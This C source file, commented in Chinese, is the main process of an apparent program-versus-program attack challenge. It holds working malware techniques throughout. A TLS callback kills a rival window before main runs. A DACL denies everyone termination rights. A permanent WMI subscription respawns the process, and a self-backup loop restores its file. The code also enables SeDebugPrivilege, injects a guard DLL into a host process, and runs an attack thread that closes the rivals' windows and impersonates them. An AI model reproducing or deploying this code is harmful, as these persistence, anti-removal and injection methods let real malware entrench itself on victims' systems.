/*
 * xx.c - 主进程（集成 DeamonInit、guard.dll 加载，修复路径写入）
 * 编译器：GNU GCC (MinGW-w64)
 * 编译选项：gcc -s -O2 -Wall -static -o "%OUTDIR%\xx.exe" xx\xx.c ^
    -lole32 -loleaut32 -lwbemuuid -ladvapi32 -lpsapi -lshell32
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_DCOM

#include <windows.h>
#include <accctrl.h>
#include <aclapi.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <time.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <wbemidl.h>


/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"

/* Fix for MinGW missing CIM_FLAG_ANY */
#ifndef CIM_FLAG_ANY
#define CIM_FLAG_ANY 0
#endif

/* 全局变量 */
HANDLE g_hSharedMem = NULL;
PVOID  g_pSharedView = NULL;
WCHAR  g_szHeartbeatSuffix[64];
HANDLE g_hHeartbeatEvent = NULL;
HANDLE g_hSelfHandle = NULL;   /* 收紧 DACL 之前拿到的自身进程句柄（交给 guard） */
DWORD  g_dwOwnSession = 0;     /* 收紧 DACL 之前取到的会话号（之后取会失败） */
CRITICAL_SECTION g_csLog;

/* 前置声明 */
static BOOL InitSecurityDescriptor(void);
static BOOL InitSharedMemory(void);
static BOOL CreateHeartbeatSuffix(void);
static BOOL SetupWMISubscription(void);
static DWORD WINAPI InitThread(LPVOID lpParam);
static DWORD WINAPI AttackThread(LPVOID lpParam);
static void WriteLog(const WCHAR *format, ...);
void RegisterSelfToXpt(void);

// ------------------- 开局先杀一遍 --------------------
// TLS 回调在 loader lock 下执行：
// - 禁止 Sleep / SendMessage（同步跨进程，卡住 = 系统级死锁）
// - 只做一次非阻塞 PostMessage；窗口可能还没建好，重试交给独立线程
static DWORD WINAPI EarlyStrikeThread(LPVOID param);

static void NTAPI EarlyPayload(PVOID hModule, DWORD reason, PVOID reserved)
{
    (void)hModule; (void)reserved;
    if (reason != DLL_PROCESS_ATTACH)
        return;

    HWND hwnd = FindWindowW(L"ChallengeWindowClass", L"YY_Defensive_GUI");
    if (hwnd)
        PostMessageW(hwnd, WM_DESTROY, 0, 0);

    /* 线程在 loader lock 释放后才运行，不受回调上下文限制 */
    CreateThread(NULL, 0, EarlyStrikeThread, NULL, 0, NULL);
}

/* yy 窗口可能晚于 xx 创建，有限重试 2 秒 */
static DWORD WINAPI EarlyStrikeThread(LPVOID param)
{
    (void)param;
    for (int i = 0; i < 40; i++) {
        HWND hwnd = FindWindowW(L"ChallengeWindowClass", L"YY_Defensive_GUI");
        if (hwnd) {
            PostMessageW(hwnd, WM_DESTROY, 0, 0);
            return 0;
        }
        Sleep(50);
    }
    return 0;
}

/* 放进 .CRT$XLB 段，加载器按段名排序后作为 TLS 回调调用 */
#if defined(__GNUC__)
__attribute__((section(".CRT$XLB"), used))
#endif
static PIMAGE_TLS_CALLBACK pEarlyPayload = EarlyPayload;

/* MinGW ld 只有在镜像真的用了 TLS 时才生成 TLS Directory，
   否则 .CRT$XLB 段整个被丢弃、回调永不触发。这个 __thread 就是门票。 */
#if defined(__GNUC__)
__attribute__((used))
static __thread volatile int g_tlsTicket = 1;
#endif

/* ================== 安全描述符 ================== */
static BOOL InitSecurityDescriptor(void)
{
    HANDLE hToken = NULL;
    BYTE tokenUser[sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE];
    DWORD dwLen = sizeof(tokenUser);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)tokenUser;
    LPWSTR szUserSid = NULL;
    WCHAR szSDDL[256];
    PSECURITY_DESCRIPTOR pSD = NULL;
    ULONG cbSD = 0;
    PACL pDacl = NULL;
    BOOL bDaclPresent = FALSE, bDaclDefaulted = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    if (!GetTokenInformation(hToken, TokenUser, tokenUser, dwLen, &dwLen)) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);

    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &szUserSid))
        return FALSE;

    _snwprintf(szSDDL, _countof(szSDDL),
        L"D:(D;OICI;GA;;;WD)(A;OICI;GA;;;SY)(A;OICI;GRGWGX;;;%s)", szUserSid);
    LocalFree(szUserSid);

    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            szSDDL, SDDL_REVISION_1, &pSD, &cbSD))
        return FALSE;

    if (!GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted) || !bDaclPresent) {
        LocalFree(pSD);
        return FALSE;
    }

    if (SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT,
                        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                        NULL, NULL, pDacl, NULL) != ERROR_SUCCESS)
    {
        if (SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT,
                            DACL_SECURITY_INFORMATION,
                            NULL, NULL, pDacl, NULL) != ERROR_SUCCESS) {
            LocalFree(pSD);
            return FALSE;
        }
    }

    LocalFree(pSD);
    return TRUE;
}

/* 将自己注册到 xpt.xpt（覆盖写入，模仿 xpt.cpp） */
void RegisterSelfToXpt(void)
{
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    DWORD pid = GetCurrentProcessId();

    // 构造与 xx.exe 同目录的 xpt.xpt
    char xptPath[MAX_PATH];
    snprintf(xptPath, MAX_PATH, "%s", selfPath);   /* 保证以 NUL 结尾 */
    char *pSlash = strrchr(xptPath, '\\');
    if (pSlash) pSlash[1] = '\0';
    strncat(xptPath, XPT_FILE_NAME, MAX_PATH - strlen(xptPath) - 1);

    // 覆盖写入
    FILE *fp = fopen(xptPath, "w");
    if (fp) {
        fprintf(fp, "%lu\n%s\n", pid, selfPath);
        fclose(fp);
    }
}

/* ================== 共享内存 ================== */
static BOOL InitSharedMemory(void)
{
    DWORD dwRand;
    BOOL  bFresh;

    g_hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
                                      0, SHARED_MEM_SIZE, SHARED_MEM_NAME);
    if (g_hSharedMem) {
        /* ERROR_ALREADY_EXISTS 表示已有实例在跑：此时绝不能清零，否则会把它的
           心跳后缀/弹窗后缀/日志/句柄表一并抹掉；而老 window.dll 实例只在启动时
           读过一次事件名，会永远 SetEvent 一个再也没人等的名字。 */
        bFresh = (GetLastError() != ERROR_ALREADY_EXISTS);
    } else {
        /* 没有 SeCreateGlobalPrivilege（非提权运行）：退到单会话命名空间 */
        g_hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
                                          0, SHARED_MEM_SIZE, SHARED_MEM_NAME_LOCAL);
        if (!g_hSharedMem) return FALSE;
        bFresh = (GetLastError() != ERROR_ALREADY_EXISTS);
    }

    g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_ALL_ACCESS, 0, 0, SHARED_MEM_SIZE);
    if (!g_pSharedView) {
        CloseHandle(g_hSharedMem);
        g_hSharedMem = NULL;
        return FALSE;
    }

    srand(GetTickCount() ^ GetCurrentProcessId());
    dwRand = ((DWORD)rand() << 16) ^ (DWORD)rand() ^ GetTickCount();

    if (bFresh) {
        memset(g_pSharedView, 0, SHARED_MEM_SIZE);
        XX_LAYOUT(g_pSharedView) = XX_LAYOUT_VERSION;
        XX_TAG(g_pSharedView)    = dwRand;
    } else if (XX_LAYOUT(g_pSharedView) != XX_LAYOUT_VERSION) {
        /* 旧版本或异常残留：只重置"心跳计数器..保留区"这段新字段 */
        memset((BYTE *)g_pSharedView + OFFSET_HB_TICK, 0, OFFSET_LOG - OFFSET_HB_TICK);
        XX_LAYOUT(g_pSharedView) = XX_LAYOUT_VERSION;
        XX_TAG(g_pSharedView)    = dwRand;
    }
    /* 最新启动的实例即当前 xx.exe；guard 用 xpt.xpt 取 PID，这里只作诊断 */
    XX_XXPID(g_pSharedView) = GetCurrentProcessId();
    return TRUE;
}

static BOOL CreateHeartbeatSuffix(void)
{
    DWORD tick;
    WCHAR *pSuffix;
    WCHAR *pWndSuffix;
    WCHAR szEventName[128];

    if (!g_pSharedView) return FALSE;

    tick = GetTickCount();
    srand(tick ^ GetCurrentProcessId());

    pSuffix    = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_HB_SUFFIX);
    pWndSuffix = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_WND_SUFFIX);

    /* 已有实例留下的后缀必须沿用（原因见 InitSharedMemory 注释） */
    if (pSuffix[0] != L'\0') {
        wcsncpy_s(g_szHeartbeatSuffix, _countof(g_szHeartbeatSuffix), pSuffix, _TRUNCATE);
    } else {
        int r1 = rand() & 0xFFFF;
        int r2 = (rand() >> 16) & 0xFFFF;

        _snwprintf(g_szHeartbeatSuffix, _countof(g_szHeartbeatSuffix),
                   L"%08X_%04X", tick, (r1 ^ r2));
        g_szHeartbeatSuffix[_countof(g_szHeartbeatSuffix) - 1] = L'\0';
        wcsncpy_s(pSuffix, SUFFIX_MAX, g_szHeartbeatSuffix, _TRUNCATE);
    }

    if (pWndSuffix[0] == L'\0') {
        WCHAR szWndSuffix[32];
        _snwprintf(szWndSuffix, _countof(szWndSuffix), L"%08X%04X",
                   (unsigned)(tick ^ (GetCurrentProcessId() << 16)),
                   (unsigned)(rand() & 0xFFFF));
        szWndSuffix[_countof(szWndSuffix) - 1] = L'\0';
        wcsncpy_s(pWndSuffix, SUFFIX_MAX, szWndSuffix, _TRUNCATE);
    }

    /* 心跳事件保留（兼容旧观察方式）；弹窗存活判据已改为 OFFSET_HB_TICK 计数器 */
    _snwprintf(szEventName, _countof(szEventName), L"%s%s", HEARTBEAT_PREFIX, g_szHeartbeatSuffix);
    szEventName[_countof(szEventName) - 1] = L'\0';
    g_hHeartbeatEvent = CreateEventW(NULL, TRUE, FALSE, szEventName);
    if (g_hHeartbeatEvent) {
        SetEvent(g_hHeartbeatEvent);
    }
    return TRUE;
}

/* ================== 日志系统（共享内存） ================== */
static void WriteLog(const WCHAR *format, ...)
{
    EnterCriticalSection(&g_csLog);

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR szLine[512];
    va_list args;
    va_start(args, format);
    _vsnwprintf(szLine, _countof(szLine) - 1, format, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    /* 没有弹窗时共享日志看不到，同时落一份文件 */
    {
        WCHAR fline[640];
        _snwprintf(fline, _countof(fline) - 1, L"[xx][pid=%lu] %s\r\n",
                   GetCurrentProcessId(), szLine);
        fline[_countof(fline) - 1] = L'\0';
        XXFileLog(fline);
    }

    if (g_pSharedView) {
        WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
        size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
        WCHAR temp[512];
        _snwprintf(temp, _countof(temp), L"[%02d:%02d:%02d.%03d] %s\r\n",
                   st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
        temp[_countof(temp) - 1] = L'\0';

        /* 共享日志是跨进程无锁读写的：读到别人正在搬移的中间状态时必须有界求长，
           否则 wcslen 可能越过日志区跑到映射之外 */
        size_t len = XXLogLen(pLog, maxLen + 1);
        if (len > maxLen) { pLog[maxLen] = L'\0'; len = maxLen; }

        size_t newLen = wcslen(temp);
        if (len + newLen <= maxLen) {
            /* 第二参是缓冲区总容量（含结尾 NUL），不是剩余空间 */
            wcscat_s(pLog, maxLen + 1 - len, temp);
        } else {
            /* 丢掉最旧的一段，只保留最近 maxLen 个字符 */
            size_t drop = len + newLen - maxLen;
            if (drop < len) {
                memmove(pLog, pLog + drop, (len - drop) * sizeof(WCHAR));
                pLog[len - drop] = L'\0';
            } else {
                pLog[0] = L'\0';
            }
            wcscat_s(pLog, maxLen + 1 - wcslen(pLog), temp);
        }
    }

    LeaveCriticalSection(&g_csLog);
}

/* ================== WMI 永久订阅 ================== */
static BOOL SetupWMISubscription(void)
{
    HRESULT hr;
    IWbemLocator *pLocator = NULL;
    IWbemServices *pServices = NULL;
    IEnumWbemClassObject *pEnum = NULL;
    IWbemClassObject *pFilterClass = NULL;
    IWbemClassObject *pFilterInstance = NULL;
    IWbemClassObject *pConsumerClass = NULL;
    IWbemClassObject *pConsumerInstance = NULL;
    IWbemClassObject *pBindingClass = NULL;
    IWbemClassObject *pBindingInstance = NULL;
    VARIANT var;
    BOOL bRet = FALSE;
    WCHAR szExePath[MAX_PATH];
    WCHAR szQuery[512];
    WCHAR szCmdTemplate[1024];

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        WriteLog(L"WMI: CoInitializeEx failed 0x%08X", hr);
        return FALSE;
    }

    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (void**)&pLocator);
    if (FAILED(hr) || !pLocator) {
        WriteLog(L"WMI: CoCreateInstance failed 0x%08X", hr);
        CoUninitialize();
        return FALSE;
    }

    /* 必须连 ROOT\SUBSCRIPTION：__EventFilter / __FilterToConsumerBinding 到处都有，
       但 CommandLineEventConsumer 只定义在 root\subscription。原来连的是 root\cimv2，
       于是消费类 GetObject 直接 WBEM_E_NOT_FOUND(0x80041002)，整个 WMI 复活订阅失效。
       过滤器里仍然用 EventNamespace=root\cimv2 去订阅 Win32_Process 事件。 */
    hr = pLocator->lpVtbl->ConnectServer(pLocator, L"ROOT\\SUBSCRIPTION", NULL, NULL,
                                          NULL, 0, NULL, NULL, &pServices);
    if (FAILED(hr) || !pServices) {
        WriteLog(L"WMI: ConnectServer failed 0x%08X", hr);
        pLocator->lpVtbl->Release(pLocator);
        CoUninitialize();
        return FALSE;
    }

    hr = CoSetProxyBlanket((IUnknown*)pServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                           NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                           NULL, EOAC_NONE);
    if (FAILED(hr)) {
        WriteLog(L"WMI: CoSetProxyBlanket failed 0x%08X", hr);
        goto cleanup;
    }

    if (!GetModuleFileNameW(NULL, szExePath, MAX_PATH)) {
        WriteLog(L"WMI: GetModuleFileName failed");
        goto cleanup;
    }

    swprintf_s(szQuery, _countof(szQuery),
               L"SELECT * FROM __InstanceDeletionEvent WITHIN 1 "
               L"WHERE TargetInstance ISA 'Win32_Process' "
               L"AND TargetInstance.Name = 'xx.exe'");
    swprintf_s(szCmdTemplate, _countof(szCmdTemplate),
               L"cmd.exe /c start \"\" \"%s\"", szExePath);

    /* 创建 __EventFilter */
    hr = pServices->lpVtbl->GetObject(pServices, L"__EventFilter", 0, NULL, &pFilterClass, NULL);
    if (FAILED(hr) || !pFilterClass) {
        WriteLog(L"WMI: GetObject Filter class failed 0x%08X", hr);
        goto cleanup;
    }

    hr = pFilterClass->lpVtbl->SpawnInstance(pFilterClass, 0, &pFilterInstance);
    if (FAILED(hr) || !pFilterInstance) {
        WriteLog(L"WMI: SpawnInstance Filter failed 0x%08X", hr);
        goto cleanup;
    }

    VariantInit(&var);
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"XX_RespawnFilter");
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"Name", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"WQL");
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"QueryLanguage", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"root\\cimv2");
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"EventNamespace", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(szQuery);
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"Query", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_I4;
    var.lVal = 0;
    pFilterInstance->lpVtbl->Put(pFilterInstance, L"Executability", 0, &var, CIM_FLAG_ANY);

    hr = pServices->lpVtbl->PutInstance(pServices, pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) {
        WriteLog(L"WMI: PutInstance Filter failed 0x%08X", hr);
        goto cleanup;
    }

    /* 创建 CommandLineEventConsumer */
    hr = pServices->lpVtbl->GetObject(pServices, L"CommandLineEventConsumer", 0, NULL, &pConsumerClass, NULL);
    if (FAILED(hr) || !pConsumerClass) {
        WriteLog(L"WMI: GetObject Consumer class failed 0x%08X", hr);
        goto cleanup;
    }

    hr = pConsumerClass->lpVtbl->SpawnInstance(pConsumerClass, 0, &pConsumerInstance);
    if (FAILED(hr) || !pConsumerInstance) {
        WriteLog(L"WMI: SpawnInstance Consumer failed 0x%08X", hr);
        goto cleanup;
    }

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"XX_RespawnConsumer");
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"Name", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(szCmdTemplate);
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"CommandLineTemplate", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    /* KillTimeout 是 uint32（秒），不是 bool */
    var.vt = VT_I4;
    var.lVal = 60;
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"KillTimeout", 0, &var, CIM_FLAG_ANY);

    var.vt = VT_BOOL;
    var.boolVal = VARIANT_TRUE;
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"RunInteractively", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    hr = pServices->lpVtbl->PutInstance(pServices, pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) {
        WriteLog(L"WMI: PutInstance Consumer failed 0x%08X", hr);
        goto cleanup;
    }

    /* 绑定 */
    hr = pServices->lpVtbl->GetObject(pServices, L"__FilterToConsumerBinding", 0, NULL, &pBindingClass, NULL);
    if (FAILED(hr) || !pBindingClass) {
        WriteLog(L"WMI: GetObject Binding class failed 0x%08X", hr);
        goto cleanup;
    }

    hr = pBindingClass->lpVtbl->SpawnInstance(pBindingClass, 0, &pBindingInstance);
    if (FAILED(hr) || !pBindingInstance) {
        WriteLog(L"WMI: SpawnInstance Binding failed 0x%08X", hr);
        goto cleanup;
    }

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"__EventFilter.Name=\"XX_RespawnFilter\"");
    pBindingInstance->lpVtbl->Put(pBindingInstance, L"Filter", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"CommandLineEventConsumer.Name=\"XX_RespawnConsumer\"");
    pBindingInstance->lpVtbl->Put(pBindingInstance, L"Consumer", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BOOL;
    var.boolVal = VARIANT_FALSE;
    pBindingInstance->lpVtbl->Put(pBindingInstance, L"MaintainPSProvOrder", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    hr = pServices->lpVtbl->PutInstance(pServices, pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) {
        WriteLog(L"WMI: Binding failed 0x%08X", hr);
        goto cleanup;
    }

    WriteLog(L"WMI subscription created");
    bRet = TRUE;

cleanup:
    if (pBindingInstance) pBindingInstance->lpVtbl->Release(pBindingInstance);
    if (pBindingClass) pBindingClass->lpVtbl->Release(pBindingClass);
    if (pConsumerInstance) pConsumerInstance->lpVtbl->Release(pConsumerInstance);
    if (pConsumerClass) pConsumerClass->lpVtbl->Release(pConsumerClass);
    if (pFilterInstance) pFilterInstance->lpVtbl->Release(pFilterInstance);
    if (pFilterClass) pFilterClass->lpVtbl->Release(pFilterClass);
    if (pEnum) pEnum->lpVtbl->Release(pEnum);
    if (pServices) pServices->lpVtbl->Release(pServices);
    if (pLocator) pLocator->lpVtbl->Release(pLocator);
    CoUninitialize();
    return bRet;
}

/* ================== 自保：持续维护 xx.exe 备份 ==================
   对手会结束 xx.exe 并删除磁盘文件；这里持续维护 <dir>\xxres.bin，
   复活方(svcguard.dll / window.dll)在 xx.exe 缺失时用它还原。 */
#define XX_BACKUP_NAME XX_BACKUP_NAME_W

static void GetSelfDir(WCHAR *dir, SIZE_T cch)
{
    GetModuleFileNameW(NULL, dir, (DWORD)cch);
    WCHAR *p = wcsrchr(dir, L'\\');
    if (p) p[1] = L'\0';
}

static DWORD WINAPI SelfProtectThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    WCHAR dir[MAX_PATH], self[MAX_PATH], bak[MAX_PATH];
    GetSelfDir(dir, MAX_PATH);
    swprintf_s(bak, MAX_PATH, L"%s" XX_BACKUP_NAME, dir);
    for (;;) {
        if (GetFileAttributesW(bak) == INVALID_FILE_ATTRIBUTES) {
            GetModuleFileNameW(NULL, self, MAX_PATH);
            if (CopyFileW(self, bak, FALSE))
                WriteLog(L"self backup written: %s", bak);
        }
        Sleep(1000);
    }
    return 0;
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ==================
   跨进程打开句柄做注入/击杀时标准用户权限不够，尤其跨会话与系统进程。 */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

/* ================== deferred init + DLL load thread ================== */
static DWORD WINAPI InitThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);

    if (!EnableDebugPrivilege())
        WriteLog(L"SeDebugPrivilege enable failed: %lu", GetLastError());
    else
        WriteLog(L"SeDebugPrivilege enabled");

    /* 必须在收紧 DACL 之前打开自己的进程句柄：之后 xx 的 DACL 把 Everyone
       全拒，连自己都打不开。该句柄随后写进共享内存，由 svcguard 复制给宿主
       里的 guard.dll（见 xxipc.h 的 OFFSET_SELF_HANDLE）。 */
    g_hSelfHandle = OpenProcess(XX_SHARED_HANDLE_ACCESS, FALSE, GetCurrentProcessId());
    WriteLog(L"self handle: %s", g_hSelfHandle ? L"OK" : L"failed");

    /* 会话号也必须在收紧 DACL 之前取：ProcessIdToSessionId 内部要打开自身进程，
       DACL 一锁（又没有 SeDebugPrivilege 绕过）就会失败并返回 0 —— 之前日志里
       那句 "session id: 0" 就是这么来的，XX_SESSION 于是永远没写进去。 */
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &g_dwOwnSession))
        g_dwOwnSession = 0;
    WriteLog(L"own session: %lu", g_dwOwnSession);

    if (!InitSecurityDescriptor())
        WriteLog(L"Security descriptor failed");
    else
        WriteLog(L"Security descriptor OK");

    if (!InitSharedMemory()) {
        /* 建不出映射（例如没有 SeCreateGlobalPrivilege）也继续跑下去：
           至少把 window.dll 拉起来抢弹窗锁，不要在这里整体放弃。 */
        WriteLog(L"Shared memory failed, continue without IPC");
    } else {
        WriteLog(L"Shared memory OK");
        XX_SELF_HANDLE(g_pSharedView) = (ULONGLONG)(ULONG_PTR)g_hSelfHandle;
        XX_SESSION(g_pSharedView) = (LONG)g_dwOwnSession;
    }

    if (!CreateHeartbeatSuffix()) {
        WriteLog(L"Heartbeat suffix failed, continue");
    } else {
        WriteLog(L"Heartbeat suffix: %s", g_szHeartbeatSuffix);
    }

    WriteLog(L"Loading svcguard.dll...");
    HMODULE hDeamon = LoadLibraryW(L"svcguard.dll");
    if (hDeamon) {
        WriteLog(L"svcguard.dll loaded");
        typedef void (WINAPI *DeamonInit_t)(void);
        DeamonInit_t pInit = (DeamonInit_t)GetProcAddress(hDeamon, "DeamonInit");
        if (pInit) {
            pInit();
            WriteLog(L"DeamonInit called");
        } else {
            WriteLog(L"DeamonInit not found");
        }
    } else {
        WriteLog(L"svcguard.dll failed: %lu", GetLastError());
    }

    /* window.dll 必须在慢速初始化（WMI 订阅）之前加载：
       弹窗出现得越早、抢到 Local\xx_window_guard 越早，8 秒红线越安全。 */
    WriteLog(L"Loading window.dll...");
    HMODULE hWin = LoadLibraryW(L"window.dll");
    if (hWin) {
        WriteLog(L"window.dll loaded");
    } else {
        WriteLog(L"window.dll failed: %lu", GetLastError());
    }

    RegisterSelfToXpt();

    /* guard.dll 不再由 xx.exe 加载：xx 被结束时它会一起死，无法完成"复活 xx"。
       改由 svcguard.dll 注入宿主进程，并把 xx 自己的进程句柄一并复制进去
       （共享内存登记），从而绕开 xx 的进程 DACL。 */
    WriteLog(L"guard.dll: 交由 svcguard 注入宿主进程（不在 xx 内加载）");

    SetupWMISubscription();

    /* defense.dll：动态导入 StartDefense，在新线程运行（避免 Hook 影响 xx 主流程） */
    WriteLog(L"Loading defense.dll...");
    HMODULE hDef = LoadLibraryW(L"defense.dll");
    if (hDef) {
        typedef void (WINAPI *StartDefense_t)(void);
        StartDefense_t pDef = (StartDefense_t)GetProcAddress(hDef, "StartDefense");
        if (pDef) {
            HANDLE hDefThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pDef, NULL, 0, NULL);
            if (hDefThread) CloseHandle(hDefThread);
            WriteLog(L"defense.dll StartDefense started");
        } else {
            WriteLog(L"defense StartDefense not found");
        }
    } else {
        WriteLog(L"defense.dll failed: %lu", GetLastError());
    }

    return 0;
}

/* ================== 攻击线程（保持不变，已稳定） ================== */
static DWORD WINAPI AttackThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    WriteLog(L"Attack thread starting...");

    WCHAR ownSuffix[MAX_WND_SUFFIX] = { 0 };
    HANDLE hMap = OpenFileMappingW(FILE_MAP_READ, FALSE, SHARED_MEM_NAME);
    if (hMap) {
        void *pView = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
        if (pView) {
            WCHAR *pSuffix = (WCHAR *)((BYTE *)pView + OFFSET_WND_SUFFIX);
            wcsncpy_s(ownSuffix, MAX_WND_SUFFIX, pSuffix, _TRUNCATE);
            UnmapViewOfFile(pView);
        }
        CloseHandle(hMap);
    }

    HMODULE hKill = LoadLibraryW(L"atkcore.dll");
    if (hKill) {
        typedef void (WINAPI *StartAttack_t)(void);
        StartAttack_t pStart = (StartAttack_t)GetProcAddress(hKill, "StartAttack");
        if (pStart) {
            pStart();
            WriteLog(L"atkcore.dll StartAttack called");
        }
    }

    WriteLog(L"Window spoofing active");

    while (1) {
        HWND hWnd = GetTopWindow(NULL);
        while (hWnd) {
            if (!IsWindow(hWnd)) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }
            if (!IsWindowVisible(hWnd)) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }

            WCHAR cls[128] = { 0 };
            GetClassNameW(hWnd, cls, _countof(cls));

            BOOL bOwn = FALSE;
            if (wcsstr(cls, L"XX_ALIVE_WND_")) {
                if (ownSuffix[0] && wcsstr(cls, ownSuffix)) bOwn = TRUE;
                else if (ownSuffix[0] == L'\0') bOwn = TRUE;
            }
            if (bOwn) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }

            DWORD pid = 0;
            GetWindowThreadProcessId(hWnd, &pid);
            if (pid == 0) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }

            BOOL bTarget = FALSE;
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (hProc) {
                WCHAR path[MAX_PATH];
                DWORD size = MAX_PATH;
                if (QueryFullProcessImageNameW(hProc, 0, path, &size)) {
                    WCHAR *pName = wcsrchr(path, L'\\');
                    if (pName) pName++; else pName = path;
                    if (_wcsicmp(pName, L"yy.exe") == 0 || _wcsicmp(pName, L"ww.exe") == 0)
                        bTarget = TRUE;
                }
                CloseHandle(hProc);
            }
            if (!bTarget) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }

            WCHAR enemyCls[128], enemyTitle[256];
            wcscpy_s(enemyCls, _countof(enemyCls), cls);
            GetWindowTextW(hWnd, enemyTitle, _countof(enemyTitle));

            PostMessage(hWnd, WM_CLOSE, 0, 0);
            BOOL bClosed = FALSE;
            for (int i = 0; i < 10; i++) {
                if (!IsWindow(hWnd)) { bClosed = TRUE; break; }
                Sleep(50);
            }
            if (!bClosed) PostMessage(hWnd, WM_QUIT, 0, 0);

            if (bClosed || !IsWindow(hWnd)) {
                WNDCLASSW wc = { 0 };
                wc.lpfnWndProc = DefWindowProcW;
                wc.hInstance = GetModuleHandleW(NULL);
                wc.lpszClassName = enemyCls;
                RegisterClassW(&wc);
                CreateWindowExW(0, enemyCls, enemyTitle, WS_POPUP,
                                0, 0, 1, 1, NULL, NULL, wc.hInstance, NULL);
            }

            hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
        }
        /* 降低 xx.exe 自身窗口扫描频率：攻击负荷在被注入的副本里，这里 300ms 足够 */
        Sleep(300);
    }
    return 0;
}
